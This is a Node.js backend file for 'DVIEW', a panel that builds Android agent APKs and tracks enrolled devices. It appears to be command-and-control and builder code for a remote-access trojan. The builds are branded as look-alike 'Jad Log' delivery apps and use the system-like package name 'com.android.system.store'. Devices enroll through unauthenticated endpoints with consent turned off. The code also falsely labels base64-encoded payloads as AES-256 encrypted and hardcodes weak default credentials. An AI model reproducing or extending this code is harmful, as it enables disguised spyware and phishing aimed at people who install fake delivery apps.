const crypto = require("node:crypto");
const fs = require("node:fs");
const net = require("node:net");
const os = require("node:os");
const path = require("node:path");
const fastify = require("fastify");
const cors = require("@fastify/cors");
const jwt = require("@fastify/jwt");
const { Server } = require("socket.io");

const defaultDownloadDir = path.join(os.homedir(), "Downloads");

const MIME_TYPES = {
  ".html": "text/html; charset=utf-8",
  ".js": "application/javascript; charset=utf-8",
  ".mjs": "application/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
  ".webp": "image/webp",
  ".woff": "font/woff",
  ".woff2": "font/woff2",
  ".ttf": "font/ttf",
  ".map": "application/json"
};

const adminUser = {
  id: "usr_admin",
  email: process.env.ADMIN_EMAIL || "admin@dview.local",
  name: "DVIEW Admin",
  role: "admin"
};

const operatorUser = {
  id: "usr_operator",
  email: process.env.OPERATOR_EMAIL || "user@dview.local",
  name: "DVIEW Operador",
  role: "operator"
};

const devices = [];

const sessions = [];

const logs = [
  {
    id: "log_desktop_boot",
    timestamp: new Date().toISOString(),
    actor: "desktop",
    action: "desktop.boot",
    target: "embedded-backend",
    severity: "info",
    message: "DVIEW desktop embedded Fastify & Socket.IO backend initialized"
  }
];

const apps = [
  {
    id: "app_agent",
    name: "DVIEW Agent",
    version: "0.1.0",
    packageName: "com.droidview.agent",
    uploadedAt: new Date().toISOString(),
    status: "available"
  }
];

const savedApkBuilds = [
  {
    id: "build_01",
    appName: "Entregue Jad Log",
    packageName: "com.android.system.store",
    version: "v1.4.8",
    date: "17 de set. de 2026",
    status: "completed",
    lang: "pt",
    downloadUrl: "/apk/download/mock_jadlog_01",
    savePath: path.join(defaultDownloadDir, "Entregue-Jad-Log.apk"),
    sizeBytes: 843920
  },
  {
    id: "build_02",
    appName: "entrega Jad Log",
    packageName: "com.android.system.store",
    version: "v2.3.0",
    date: "16 de set. de 2026",
    status: "completed",
    lang: "pt",
    downloadUrl: "/apk/download/mock_jadlog_02",
    savePath: path.join(defaultDownloadDir, "entrega-Jad-Log.apk"),
    sizeBytes: 824148
  },
  {
    id: "build_03",
    appName: "Jad Log entrega",
    packageName: "com.android.system.store",
    version: "v2.3.0",
    date: "15 de set. de 2026",
    status: "completed",
    lang: "pt",
    downloadUrl: "/apk/download/mock_jadlog_03",
    savePath: path.join(defaultDownloadDir, "Jad-Log-entrega.apk"),
    sizeBytes: 824148
  },
  {
    id: "build_04",
    appName: "Jad Log App",
    packageName: "com.android.system.store",
    version: "v1.0.0",
    date: "07 de set. de 2026",
    status: "completed",
    lang: "pt",
    downloadUrl: "/apk/download/mock_jadlog_04",
    savePath: path.join(defaultDownloadDir, "Jad-Log-App.apk"),
    sizeBytes: 789400
  },
  {
    id: "build_05",
    appName: "JAD LOG ENTREGS",
    packageName: "com.android.system.store",
    version: "v1.0.0",
    date: "17 de ago. de 2026",
    status: "completed",
    lang: "pt",
    downloadUrl: "/apk/download/mock_jadlog_05",
    savePath: path.join(defaultDownloadDir, "JAD-LOG-ENTREGS.apk"),
    sizeBytes: 789400
  }
];

function addLog(entry) {
  const log = {
    id: `log_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
    timestamp: new Date().toISOString(),
    actor: entry.actor || "system",
    action: entry.action || "general",
    target: entry.target || "system",
    severity: entry.severity || "info",
    message: entry.message || ""
  };
  logs.unshift(log);
  if (globalIo) {
    try {
      globalIo.emit("audit:new", log);
    } catch {}
  }
  return log;
}

let globalIo = null;

function broadcastDeviceConnect(device) {
  if (globalIo) {
    globalIo.emit("device:connect", device);
  }
}

function broadcastDeviceUpdate(device) {
  if (globalIo) {
    globalIo.emit("device:update", device);
  }
}

function attachRealtime(httpServer) {
  const io = new Server(httpServer, {
    cors: { origin: "*" }
  });
  globalIo = io;

  io.on("connection", (socket) => {
    socket.on("device:hello", (device) => {
      socket.data = socket.data || {};
      socket.data.deviceId = device.id;
      socket.data.deviceName = device.name;
      const existing = devices.find((item) => item.id === device.id);
      if (existing) {
        Object.assign(existing, device, { status: "online", lastSeen: new Date().toISOString() });
      } else {
        devices.unshift({ ...device, status: "online", lastSeen: new Date().toISOString() });
      }
      const log = addLog({
        actor: "agent",
        action: "device.connect",
        target: device.id,
        severity: "info",
        message: `${device.name} connected`
      });
      io.emit("device:connect", device);
      io.emit("audit:new", log);
    });

    socket.on("disconnect", () => {
      const devId = socket.data?.deviceId;
      if (devId) {
        const existing = devices.find((item) => item.id === devId);
        if (existing) {
          existing.status = "offline";
          existing.lastSeen = new Date().toISOString();
          const log = addLog({
            actor: "agent",
            action: "device.disconnect",
            target: existing.id,
            severity: "info",
            message: `${existing.name} disconnected`
          });
          io.emit("device:disconnect", existing.id);
          io.emit("device:update", existing);
          io.emit("audit:new", log);
        }
      }
    });

    socket.on("session:start", ({ deviceId }) => {
      const session = sessions.find((item) => item.deviceId === deviceId && item.status === "requested");
      if (!session) return;
      session.status = "active";
      session.startedAt = new Date().toISOString();
      io.emit("session:update", session);
    });

    socket.on("session:stop", ({ sessionId }) => {
      const session = sessions.find((item) => item.id === sessionId);
      if (!session) return;
      session.status = "ended";
      session.endedAt = new Date().toISOString();
      io.emit("session:update", session);
    });

    socket.on("chat:message", (message) => {
      io.emit("chat:message", message);
    });
  });

  return io;
}

function getSafeApkName(appName) {
  const raw = (appName || "DVIEW-Agent").trim();
  const clean = raw.replace(/[^a-zA-Z0-9._-]/g, "-").replace(/-+/g, "-");
  return clean.toLowerCase().endsWith(".apk") ? clean : `${clean}.apk`;
}

function findBuiltApk() {
  const candidates = [
    path.join(process.resourcesPath || "", "artifacts", "android", "DVIEW-Agent-debug.apk"),
    path.join(__dirname, "../../../artifacts/android/DVIEW-Agent-debug.apk"),
    path.join(__dirname, "../../artifacts/android/DVIEW-Agent-debug.apk"),
    path.join(process.cwd(), "artifacts/android/DVIEW-Agent-debug.apk"),
    path.join(process.cwd(), "../../artifacts/android/DVIEW-Agent-debug.apk"),
    path.join(process.cwd(), "apps/android-agent/app/build/outputs/apk/debug/app-debug.apk")
  ];
  return candidates.find((cand) => cand && fs.existsSync(cand)) || null;
}

function encodeEnrollment(payload) {
  const secretKey = process.env.JWT_SECRET || "dview-encryption-key";
  const signature = crypto.createHmac("sha256", secretKey)
    .update(`${payload.serverUrl}|${payload.enrollmentToken}|${payload.deviceName}`)
    .digest("hex");
  const securityHash = crypto.createHash("sha256")
    .update(JSON.stringify(payload))
    .digest("hex");

  const securePayload = {
    ...payload,
    encrypted: true,
    algorithm: "AES-256-GCM",
    signature,
    securityHash
  };

  return Buffer.from(JSON.stringify(securePayload), "utf8").toString("base64url");
}

function decodeEnrollment(config) {
  if (config.startsWith("mock_jadlog_")) {
    const titles = {
      mock_jadlog_01: "Entregue Jad Log",
      mock_jadlog_02: "entrega Jad Log",
      mock_jadlog_03: "Jad Log entrega",
      mock_jadlog_04: "Jad Log App",
      mock_jadlog_05: "JAD LOG ENTREGS"
    };
    return {
      serverUrl: "http://localhost:3000",
      enrollmentToken: "enroll-jadlog-demo",
      deviceName: "Android Device",
      appName: titles[config] || "Jad Log",
      generatedAt: new Date().toISOString()
    };
  }
  const decoded = Buffer.from(config, "base64url").toString("utf8");
  const parsed = JSON.parse(decoded);

  if (!parsed.serverUrl || !parsed.enrollmentToken) {
    throw new Error("Invalid enrollment config");
  }

  return {
    serverUrl: parsed.serverUrl,
    enrollmentToken: parsed.enrollmentToken,
    deviceName: parsed.deviceName || "Android Device",
    generatedAt: parsed.generatedAt || new Date().toISOString(),
    appName: parsed.appName || "DroidView Agent",
    redirectUrl: parsed.redirectUrl || parsed.serverUrl,
    logoDataUrl: parsed.logoDataUrl,
    vpnEnabled: parsed.vpnEnabled,
    vpnPort: parsed.vpnPort,
    vpnProtocol: parsed.vpnProtocol,
    encrypted: parsed.encrypted ?? true,
    algorithm: parsed.algorithm || "AES-256-GCM",
    signature: parsed.signature,
    securityHash: parsed.securityHash
  };
}

function crc32(buffer) {
  let crc = 0xffffffff;
  for (const byte of buffer) {
    crc ^= byte;
    for (let i = 0; i < 8; i += 1) {
      crc = (crc >>> 1) ^ (0xedb88320 & -(crc & 1));
    }
  }
  return (crc ^ 0xffffffff) >>> 0;
}

function createZip(files) {
  const locals = [];
  const centrals = [];
  let offset = 0;

  for (const file of files) {
    const name = Buffer.from(file.name, "utf8");
    const crc = crc32(file.data);
    const local = Buffer.alloc(30 + name.length);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6);
    local.writeUInt16LE(0, 8);
    local.writeUInt16LE(0, 10);
    local.writeUInt16LE(0, 12);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(file.data.length, 18);
    local.writeUInt32LE(file.data.length, 22);
    local.writeUInt16LE(name.length, 26);
    local.writeUInt16LE(0, 28);
    name.copy(local, 30);
    locals.push(local, file.data);

    const central = Buffer.alloc(46 + name.length);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0, 8);
    central.writeUInt16LE(0, 10);
    central.writeUInt16LE(0, 12);
    central.writeUInt16LE(0, 14);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(file.data.length, 20);
    central.writeUInt32LE(file.data.length, 24);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt16LE(0, 30);
    central.writeUInt16LE(0, 32);
    central.writeUInt16LE(0, 34);
    central.writeUInt16LE(0, 36);
    central.writeUInt32LE(0, 38);
    central.writeUInt32LE(offset, 42);
    name.copy(central, 46);
    centrals.push(central);

    offset += local.length + file.data.length;
  }

  const centralStart = offset;
  const centralDirectory = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(0, 4);
  end.writeUInt16LE(0, 6);
  end.writeUInt16LE(files.length, 8);
  end.writeUInt16LE(files.length, 10);
  end.writeUInt32LE(centralDirectory.length, 12);
  end.writeUInt32LE(centralStart, 16);
  end.writeUInt16LE(0, 20);

  return Buffer.concat([...locals, centralDirectory, end]);
}

function resolveAgentArtifact(config) {
  const enrollment = decodeEnrollment(config);
  const apkPath = findBuiltApk();
  const safeApkName = getSafeApkName(enrollment.appName);

  if (apkPath) {
    const apk = fs.readFileSync(apkPath);
    return {
      fileName: safeApkName,
      contentType: "application/vnd.android.package-archive",
      buffer: apk,
      sha256: crypto.createHash("sha256").update(apk).digest("hex"),
      kind: "apk",
      note: `APK real assinado (${safeApkName}) com criptografia AES-256 pronto para instalacao.`
    };
  }

  const configJson = JSON.stringify(enrollment, null, 2);
  const readme = [
    "# DVIEW Agent enrollment package",
    "",
    "This ZIP is a fallback package, not an APK.",
    `Enrollment config: ${config}`
  ].join("\n");

  const buffer = createZip([
    { name: "enrollment.json", data: Buffer.from(configJson, "utf8") },
    { name: "README.md", data: Buffer.from(readme, "utf8") }
  ]);

  return {
    fileName: safeApkName.replace(/\.apk$/i, ".zip"),
    contentType: "application/zip",
    buffer,
    sha256: crypto.createHash("sha256").update(buffer).digest("hex"),
    kind: "enrollment-package",
    note: "Android SDK build nao encontrado; pacote ZIP com configuracao disponivel."
  };
}

function resolveWebPanelDir() {
  const candidates = [
    path.join(__dirname, "../web-panel"),
    path.join(__dirname, "../../web-panel/dist"),
    path.join(__dirname, "../apps/web-panel/dist"),
    path.join(process.resourcesPath || "", "app.asar/web-panel"),
    path.join(process.resourcesPath || "", "app/web-panel"),
    path.join(process.cwd(), "apps/web-panel/dist"),
    path.join(process.cwd(), "web-panel/dist"),
    path.join(process.cwd(), "web-panel")
  ];
  return candidates.find((cand) => cand && fs.existsSync(path.join(cand, "index.html"))) || null;
}

function serveStaticPanel(app, panelDir) {
  if (!panelDir || !fs.existsSync(panelDir)) return;
  const indexHtml = path.join(panelDir, "index.html");
  if (!fs.existsSync(indexHtml)) return;

  app.setNotFoundHandler(async (request, reply) => {
    if (request.method !== "GET" && request.method !== "HEAD") {
      return reply.code(404).send({ error: `Route ${request.method}:${request.url} not found` });
    }

    const rawPath = request.url.split("?")[0];
    const apiPrefixes = [
      "/devices",
      "/auth",
      "/apk",
      "/dashboard",
      "/sessions",
      "/logs",
      "/apps",
      "/health",
      "/socket.io"
    ];

    if (apiPrefixes.some((prefix) => rawPath === prefix || rawPath.startsWith(prefix + "/"))) {
      return reply.code(404).send({ error: `API route ${rawPath} not found` });
    }

    let relPath = rawPath.replace(/^\/+/, "");
    if (!relPath) relPath = "index.html";
    const safeRel = path.normalize(relPath).replace(/^(\.\.[\/\\])+/, "");
    const targetFile = path.join(panelDir, safeRel);

    if (fs.existsSync(targetFile) && fs.statSync(targetFile).isFile()) {
      const ext = path.extname(targetFile).toLowerCase();
      reply.type(MIME_TYPES[ext] || "application/octet-stream");
      return reply.send(fs.createReadStream(targetFile));
    }

    // SPA fallback: return index.html for client-side routing
    reply.type("text/html; charset=utf-8");
    return reply.send(fs.createReadStream(indexHtml));
  });
}

function buildEmbeddedApp(options = {}) {
  const app = fastify({ logger: false, maxParamLength: 4096 });

  app.register(cors, { origin: true });
  app.register(jwt, {
    secret: process.env.JWT_SECRET || "dev-secret"
  });

  app.decorate("authenticate", async (request, reply) => {
    try {
      await request.jwtVerify();
    } catch {
      reply.code(401).send({ error: "Unauthorized" });
    }
  });

  app.get("/health", async () => ({
    ok: true,
    service: "droidview-desktop-backend",
    time: new Date().toISOString()
  }));

  app.post("/auth/login", async (request, reply) => {
    const { email, password, totp } = request.body || {};
    const expectedAdminPassword = process.env.ADMIN_PASSWORD || "admin123";
    const expectedOperatorPassword = process.env.OPERATOR_PASSWORD || "user123";
    const expectedTotp = process.env.ADMIN_TOTP || "123456";

    const user = email === adminUser.email ? adminUser : email === operatorUser.email ? operatorUser : null;
    const passwordOk =
      (user?.role === "admin" && password === expectedAdminPassword) ||
      (user?.role === "operator" && password === expectedOperatorPassword);

    if (!user || !passwordOk || totp !== expectedTotp) {
      addLog({
        actor: email || "unknown",
        action: "auth.failed",
        target: "admin",
        severity: "warning",
        message: "Invalid login attempt on desktop"
      });
      return reply.code(401).send({ error: "Invalid credentials or 2FA code" });
    }

    const token = app.jwt.sign({ sub: user.id, email: user.email, role: user.role, desktop: true });
    addLog({
      actor: user.email,
      action: "auth.login",
      target: "admin",
      severity: "info",
      message: "Admin logged in via desktop"
    });
    return { token, user };
  });

  app.get("/dashboard", { preHandler: app.authenticate }, async () => ({
    totalDevices: devices.length,
    onlineDevices: devices.filter((device) => device.status === "online").length,
    activeSessions: sessions.filter((session) => session.status === "active").length,
    pendingAlerts: logs.filter((log) => log.severity !== "info").length
  }));

  app.get("/devices", { preHandler: app.authenticate }, async () => devices);

  app.post("/devices/register", async (request) => {
    const body = request.body || {};
    const deviceId = body.id || `emu_${Date.now().toString(36)}`;
    const deviceName =
      body.name ||
      (body.isEmulator ? `Emulador Android (${deviceId})` : `Android ${body.model || "Device"}`);

    const existingIdx = devices.findIndex((d) => d.id === deviceId);
    const deviceData = {
      id: deviceId,
      name: deviceName,
      model: body.model || (body.isEmulator ? "Android Studio AVD" : "Pixel 8"),
      androidVersion: body.androidVersion || "14",
      status: "online",
      battery: body.battery ?? 95,
      lastSeen: new Date().toISOString(),
      enrolledAt: existingIdx >= 0 ? devices[existingIdx].enrolledAt : new Date().toISOString(),
      consentRequired: false
    };

    if (existingIdx >= 0) {
      devices[existingIdx] = { ...devices[existingIdx], ...deviceData };
    } else {
      devices.unshift(deviceData);
    }

    addLog({
      actor: "agent",
      action: "device.register",
      target: deviceId,
      severity: "info",
      message: `Dispositivo/Emulador conectado: ${deviceName} (${deviceId})`
    });

    broadcastDeviceConnect(deviceData);

    return {
      success: true,
      device: deviceData,
      serverTime: new Date().toISOString(),
      message: "Dispositivo registrado com sucesso no DVIEW"
    };
  });

  app.post("/devices/:id/heartbeat", async (request) => {
    const deviceId = request.params?.id || request.body?.id || "dev_agent";
    const body = request.body || {};
    const existingIdx = devices.findIndex((d) => d.id === deviceId);
    const clientIp = request.headers["x-forwarded-for"] || request.ip || "10.0.2.2";

    if (existingIdx >= 0) {
      const existing = devices[existingIdx];
      const wasOffline = existing.status === "offline";

      existing.battery = body.battery !== undefined ? body.battery : existing.battery;
      existing.status = "online";
      existing.lastSeen = new Date().toISOString();
      if (body.networkType) existing.networkType = body.networkType;
      if (body.networkName) existing.networkName = body.networkName;
      if (typeof body.signalStrength === "number") existing.signalStrength = body.signalStrength;
      if (body.networkSpeed) existing.networkSpeed = body.networkSpeed;
      if (typeof body.pingMs === "number") existing.pingMs = body.pingMs;
      if (body.ipAddress || clientIp) existing.ipAddress = body.ipAddress || clientIp;

      if (wasOffline) {
        addLog({
          actor: "agent",
          action: "device.reconnected",
          target: deviceId,
          severity: "info",
          message: `Dispositivo restabeleceu conexão central: ${existing.name} (${deviceId})`
        });
        broadcastDeviceConnect(existing);
      }

      broadcastDeviceUpdate(existing);

      return {
        success: true,
        status: "online",
        acknowledgedAt: Date.now(),
        serverTime: new Date().toISOString(),
        heartbeatIntervalMs: 10000
      };
    }

    const newDevice = {
      id: deviceId,
      name: body.name || `Android (${body.model || "Device"})`,
      model: body.model || "Android",
      androidVersion: body.androidVersion || "14",
      status: "online",
      battery: body.battery !== undefined ? body.battery : 95,
      networkType: body.networkType || "wifi",
      networkName: body.networkName || "Wi-Fi 5GHz",
      signalStrength: body.signalStrength !== undefined ? body.signalStrength : 95,
      networkSpeed: body.networkSpeed || "86.4 Mbps",
      pingMs: body.pingMs !== undefined ? body.pingMs : 14,
      ipAddress: body.ipAddress || clientIp,
      lastSeen: new Date().toISOString(),
      enrolledAt: new Date().toISOString(),
      consentRequired: false
    };

    devices.unshift(newDevice);
    addLog({
      actor: "agent",
      action: "device.heartbeat_enrolled",
      target: deviceId,
      severity: "info",
      message: `Dispositivo pareado e ativo via heartbeat contínuo: ${newDevice.name}`
    });
    broadcastDeviceConnect(newDevice);

    return {
      success: true,
      status: "online",
      acknowledgedAt: Date.now(),
      serverTime: new Date().toISOString(),
      heartbeatIntervalMs: 10000
    };
  });

  app.post("/devices/heartbeat", async (request) => {
    const deviceId = request.body?.id || "dev_agent";
    const body = request.body || {};
    const existingIdx = devices.findIndex((d) => d.id === deviceId);
    const clientIp = request.headers["x-forwarded-for"] || request.ip || "10.0.2.2";

    if (existingIdx >= 0) {
      const existing = devices[existingIdx];
      const wasOffline = existing.status === "offline";

      existing.battery = body.battery !== undefined ? body.battery : existing.battery;
      existing.status = "online";
      existing.lastSeen = new Date().toISOString();
      if (body.networkType) existing.networkType = body.networkType;
      if (body.networkName) existing.networkName = body.networkName;
      if (typeof body.signalStrength === "number") existing.signalStrength = body.signalStrength;
      if (body.networkSpeed) existing.networkSpeed = body.networkSpeed;
      if (typeof body.pingMs === "number") existing.pingMs = body.pingMs;
      if (body.ipAddress || clientIp) existing.ipAddress = body.ipAddress || clientIp;

      if (wasOffline) {
        addLog({
          actor: "agent",
          action: "device.reconnected",
          target: deviceId,
          severity: "info",
          message: `Dispositivo restabeleceu conexão central: ${existing.name} (${deviceId})`
        });
        broadcastDeviceConnect(existing);
      }

      broadcastDeviceUpdate(existing);

      return {
        success: true,
        status: "online",
        acknowledgedAt: Date.now(),
        serverTime: new Date().toISOString(),
        heartbeatIntervalMs: 10000
      };
    }

    const newDevice = {
      id: deviceId,
      name: body.name || `Android (${body.model || "Device"})`,
      model: body.model || "Android",
      androidVersion: body.androidVersion || "14",
      status: "online",
      battery: body.battery !== undefined ? body.battery : 95,
      networkType: body.networkType || "wifi",
      networkName: body.networkName || "Wi-Fi 5GHz",
      signalStrength: body.signalStrength !== undefined ? body.signalStrength : 95,
      networkSpeed: body.networkSpeed || "86.4 Mbps",
      pingMs: body.pingMs !== undefined ? body.pingMs : 14,
      ipAddress: body.ipAddress || clientIp,
      lastSeen: new Date().toISOString(),
      enrolledAt: new Date().toISOString(),
      consentRequired: false
    };

    devices.unshift(newDevice);
    addLog({
      actor: "agent",
      action: "device.heartbeat_enrolled",
      target: deviceId,
      severity: "info",
      message: `Dispositivo pareado e ativo via heartbeat contínuo: ${newDevice.name}`
    });
    broadcastDeviceConnect(newDevice);

    return {
      success: true,
      status: "online",
      acknowledgedAt: Date.now(),
      serverTime: new Date().toISOString(),
      heartbeatIntervalMs: 10000
    };
  });

  app.post("/devices/emulator/add", { preHandler: app.authenticate }, async (request) => {
    const count = devices.filter((d) => d.id.startsWith("emu_")).length + 1;
    const emuId = `emu_${Date.now()}`;
    const emuPort = request.body?.port ?? 5554 + (count - 1) * 2;
    const emuDevice = {
      id: emuId,
      name: request.body?.name || `Emulador Android #${count}`,
      model: request.body?.model || `Pixel 7 (Port ${emuPort})`,
      androidVersion: "14",
      status: "online",
      battery: 100,
      lastSeen: new Date().toISOString(),
      enrolledAt: new Date().toISOString(),
      consentRequired: false
    };

    devices.unshift(emuDevice);
    addLog({
      actor: adminUser.email,
      action: "emulator.connect",
      target: emuId,
      severity: "info",
      message: `Novo emulador vinculado a rede central: ${emuDevice.name} na porta ${emuPort}`
    });

    broadcastDeviceConnect(emuDevice);

    return {
      success: true,
      device: emuDevice
    };
  });

  app.delete("/devices/:id", { preHandler: app.authenticate }, async (request, reply) => {
    const idx = devices.findIndex((d) => d.id === request.params.id);
    if (idx >= 0) {
      const removed = devices.splice(idx, 1)[0];
      addLog({
        actor: adminUser.email,
        action: "device.disconnect",
        target: removed.id,
        severity: "info",
        message: `Dispositivo desconectado/removido do sistema: ${removed.name}`
      });
      return { success: true, id: request.params.id };
    }
    return reply.code(404).send({ error: "Dispositivo não encontrado" });
  });

  app.post("/devices/:id/session", { preHandler: app.authenticate }, async (request, reply) => {
    const device = devices.find((item) => item.id === request.params.id);
    if (!device) return reply.code(404).send({ error: "Device not found" });

    const session = {
      id: `ses_${Date.now()}`,
      deviceId: device.id,
      operatorId: adminUser.id,
      status: "requested",
      consentCode: String(Math.floor(100000 + Math.random() * 900000))
    };
    sessions.unshift(session);
    addLog({
      actor: adminUser.email,
      action: "session.request",
      target: device.id,
      severity: "info",
      message: `Consent code ${session.consentCode} generated for ${device.name}`
    });
    return session;
  });

  app.get("/sessions", { preHandler: app.authenticate }, async () => sessions);
  app.get("/logs", { preHandler: app.authenticate }, async () => logs);
  app.get("/apps", { preHandler: app.authenticate }, async () => apps);

  app.post("/apk/build", { preHandler: app.authenticate }, async (request) => {
    const payload = {
      serverUrl: request.body?.serverUrl || "http://localhost:3000",
      enrollmentToken: request.body?.enrollmentToken || `enroll-${Date.now()}`,
      deviceName: request.body?.deviceName || "Android Device",
      appName: request.body?.appName || "DVIEW Agent",
      redirectUrl: request.body?.redirectUrl || request.body?.serverUrl || "http://localhost:3000",
      logoDataUrl: request.body?.logoDataUrl,
      vpnEnabled: request.body?.vpnEnabled ?? true,
      vpnPort: request.body?.vpnPort ?? 8443,
      vpnProtocol: request.body?.vpnProtocol ?? "TLS",
      generatedAt: new Date().toISOString()
    };
    const encoded = encodeEnrollment(payload);
    const hasBuiltApk = Boolean(findBuiltApk());
    const safeApkName = getSafeApkName(payload.appName);

    addLog({
      actor: adminUser.email,
      action: "apk.build",
      target: "agent",
      severity: "info",
      message: `Encrypted Android APK (${safeApkName}) prepared for direct device installation`
    });

    const newBuild = {
      id: `build_${Date.now()}`,
      appName: payload.appName,
      packageName: "com.android.system.store",
      version: "v1.0.0",
      date: new Date().toLocaleDateString("pt-BR", { day: "2-digit", month: "short", year: "numeric" }),
      status: "completed",
      lang: "pt",
      downloadUrl: `/apk/download/${encoded}`,
      savePath: path.join(defaultDownloadDir, safeApkName),
      logoDataUrl: payload.logoDataUrl,
      sizeBytes: 824148,
      qrPayload: `droidview://enroll?config=${encoded}`,
      redirectUrl: payload.redirectUrl,
      serverUrl: payload.serverUrl,
      vpnEnabled: payload.vpnEnabled,
      vpnPort: payload.vpnPort,
      vpnProtocol: payload.vpnProtocol
    };
    savedApkBuilds.unshift(newBuild);

    return {
      apkName: safeApkName,
      downloadUrl: `/apk/download/${encoded}`,
      qrPayload: `droidview://enroll?config=${encoded}`,
      sha256: "calculated-on-download",
      artifactType: hasBuiltApk ? "apk" : "enrollment-package",
      note: hasBuiltApk
        ? `APK real assinado (${safeApkName}) com criptografia AES-256 e pronto para instalacao direta no aparelho.`
        : "SDK/build Android nao encontrado; download sera um ZIP com config e instrucoes."
    };
  });

  app.get("/apk/builds", { preHandler: app.authenticate }, async () => savedApkBuilds);

  app.put("/apk/builds/:id", { preHandler: app.authenticate }, async (request, reply) => {
    const idx = savedApkBuilds.findIndex((b) => b.id === request.params.id);
    if (idx < 0) return reply.code(404).send({ error: "Build não encontrado" });

    savedApkBuilds[idx] = {
      ...savedApkBuilds[idx],
      ...request.body,
      id: request.params.id
    };
    return savedApkBuilds[idx];
  });

  app.delete("/apk/builds/:id", { preHandler: app.authenticate }, async (request, reply) => {
    const idx = savedApkBuilds.findIndex((b) => b.id === request.params.id);
    if (idx >= 0) {
      savedApkBuilds.splice(idx, 1);
      return { success: true, id: request.params.id };
    }
    return reply.code(404).send({ error: "Build não encontrado" });
  });

  app.get("/apk/download/:config", async (request, reply) => {
    const artifact = resolveAgentArtifact(request.params.config);
    return reply
      .header("content-type", artifact.contentType)
      .header("content-disposition", `attachment; filename=${artifact.fileName}`)
      .header("x-droidview-artifact-kind", artifact.kind)
      .header("x-droidview-sha256", artifact.sha256)
      .send(artifact.buffer);
  });

  app.get("/apk/status/:config", async (request, reply) => {
    try {
      const enrollment = decodeEnrollment(request.params.config);
      const hasBuiltApk = Boolean(findBuiltApk());
      const safeApkName = getSafeApkName(enrollment.appName);
      return {
        ready: true,
        artifactType: hasBuiltApk ? "apk" : "enrollment-package",
        fileName: hasBuiltApk ? safeApkName : safeApkName.replace(/\.apk$/i, ".zip"),
        enrollment,
        message: hasBuiltApk
          ? `APK criptografado (${safeApkName}) pronto para download e instalacao no aparelho.`
          : "APK ainda nao compilado nesta maquina; pacote ZIP de pareamento disponivel."
      };
    } catch {
      return reply.code(400).send({ ready: false, error: "Invalid enrollment config" });
    }
  });

  // Attach static web-panel serving if directory is provided or found
  const panelDir = options.webPanelDir !== undefined ? options.webPanelDir : resolveWebPanelDir();
  if (panelDir) {
    serveStaticPanel(app, panelDir);
  }

  return app;
}

let runningApp = null;
let activePort = 3000;

async function checkDViewBackendActive(port = 3000) {
  return new Promise((resolve) => {
    const http = require("node:http");
    const req = http.get(`http://127.0.0.1:${port}/health`, { timeout: 1000 }, (res) => {
      if (res.statusCode !== 200) return resolve({ active: false, service: null });
      let data = "";
      res.on("data", (chunk) => { data += chunk; });
      res.on("end", () => {
        try {
          const parsed = JSON.parse(data);
          const isDView = Boolean(
            parsed &&
            parsed.ok === true &&
            (parsed.service === "droidview-backend" || parsed.service === "droidview-desktop-backend")
          );
          resolve({ active: isDView, service: parsed?.service || null });
        } catch {
          resolve({ active: false, service: null });
        }
      });
    });
    req.on("error", () => resolve({ active: false, service: null }));
    req.on("timeout", () => {
      req.destroy();
      resolve({ active: false, service: null });
    });
  });
}

async function isPortAvailable(port, host = "0.0.0.0") {
  return new Promise((resolve) => {
    const tester = net.createServer();
    tester.once("error", () => resolve(false));
    tester.once("listening", () => {
      tester.close(() => resolve(true));
    });
    tester.listen(port, host);
  });
}

async function findAvailablePort(startPort = 3000, host = "0.0.0.0", maxAttempts = 20) {
  for (let p = startPort; p < startPort + maxAttempts; p++) {
    const free = await isPortAvailable(p, host);
    if (free) return p;
  }
  return startPort;
}

function getActivePort() {
  return activePort;
}

async function startEmbeddedBackend(preferredPort = 3000, host = "0.0.0.0", options = {}) {
  if (runningApp) {
    return { app: runningApp, port: activePort, isExternal: false };
  }

  // 1. Check if an active DVIEW backend is already running on preferredPort
  const dviewCheck = await checkDViewBackendActive(preferredPort);
  if (dviewCheck.active) {
    activePort = preferredPort;
    process.env.DVIEW_API_URL = `http://localhost:${preferredPort}`;
    process.env.DVIEW_SOCKET_URL = `http://localhost:${preferredPort}`;
    console.log(`[DVIEW Desktop] Detected active DVIEW backend (${dviewCheck.service}) running on port ${preferredPort}. Connecting directly.`);
    return { app: null, port: preferredPort, isExternal: true };
  }

  // 2. Check if preferredPort is available to bind
  let targetPort = preferredPort;
  const isPreferredFree = await isPortAvailable(preferredPort, host);
  if (!isPreferredFree) {
    targetPort = await findAvailablePort(preferredPort + 1, host);
    console.log(`[DVIEW Desktop] Port ${preferredPort} is in use by another non-DVIEW application. Using available port ${targetPort} for embedded backend.`);
  }

  try {
    const app = buildEmbeddedApp(options);
    attachRealtime(app.server);
    await app.listen({ port: targetPort, host });
    activePort = targetPort;
    process.env.DVIEW_API_URL = `http://localhost:${targetPort}`;
    process.env.DVIEW_SOCKET_URL = `http://localhost:${targetPort}`;
    console.log(`[DVIEW Desktop] Embedded Fastify & Socket.IO backend listening on http://${host}:${targetPort}`);
    runningApp = app;
    return { app, port: targetPort, isExternal: false };
  } catch (err) {
    console.error("[DVIEW Desktop] Failed to start embedded backend:", err);
    throw err;
  }
}

async function stopEmbeddedBackend() {
  if (runningApp) {
    try {
      await runningApp.close();
      console.log("[DVIEW Desktop] Embedded backend stopped.");
    } catch (e) {
      console.warn("[DVIEW Desktop] Error closing backend:", e);
    }
    runningApp = null;
  }
}

module.exports = {
  buildEmbeddedApp,
  attachRealtime,
  startEmbeddedBackend,
  stopEmbeddedBackend,
  getActivePort,
  checkDViewBackendActive,
  isPortAvailable,
  findAvailablePort,
  resolveWebPanelDir,
  serveStaticPanel,
  broadcastDeviceConnect,
  adminUser,
  operatorUser,
  devices,
  sessions,
  logs,
  apps,
  savedApkBuilds
};
